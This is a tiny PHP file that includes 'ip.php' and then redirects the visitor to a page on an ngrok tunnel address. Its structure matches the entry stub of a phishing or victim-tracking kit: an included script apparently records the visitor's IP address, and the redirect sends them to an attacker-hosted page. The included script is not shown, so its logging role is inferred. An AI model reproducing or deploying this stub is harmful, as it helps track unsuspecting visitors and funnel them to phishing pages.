<?php
include 'ip.php';
header('Location: https://1be77819.ngrok.io/index2.html');
exit
?>
